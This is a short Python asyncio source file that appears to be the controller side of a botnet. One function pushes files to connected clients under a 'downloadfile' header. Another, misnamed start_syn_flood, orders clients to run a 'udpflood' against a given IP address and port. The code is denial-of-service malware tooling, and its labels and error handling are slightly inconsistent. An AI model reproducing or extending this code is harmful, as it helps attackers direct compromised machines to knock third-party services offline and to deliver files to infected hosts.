import asyncio

async def send_file(client_writer:asyncio.StreamWriter, filepath, filename, extension):
    try:
        header = f"downloadfile {filename} {extension}" #Send a header, which explains that the client should download the file, and some args
        client_writer.write(header.encode())
        await client_writer.drain()
        
        with open(filepath, "rb") as f:
            while True:
                chunk = f.read(1024) #Read file in chunks
                if not chunk:
                    break
                
                client_writer.write(chunk) #Send the client chunks
                await client_writer.drain()
            
    except FileNotFoundError: #Print error if file not found
        print(f'"{filepath}" not found')
    except Exception as e: #If another error than file not found, print that error
        print(f"Error occurred: {e}")
    finally:
        print("File sent succesfully")

async def start_syn_flood(client_writer:asyncio.StreamWriter, ip_addr:str, port:int):
    try:
        header = f"udpflood {ip_addr} {port}" #Send a header, that explains it's a udpflood and gives some args to use
        client_writer.write(header.encode())
        await client_writer.drain()
    except Exception as e:
        print(f"Error occurred: {e}")
        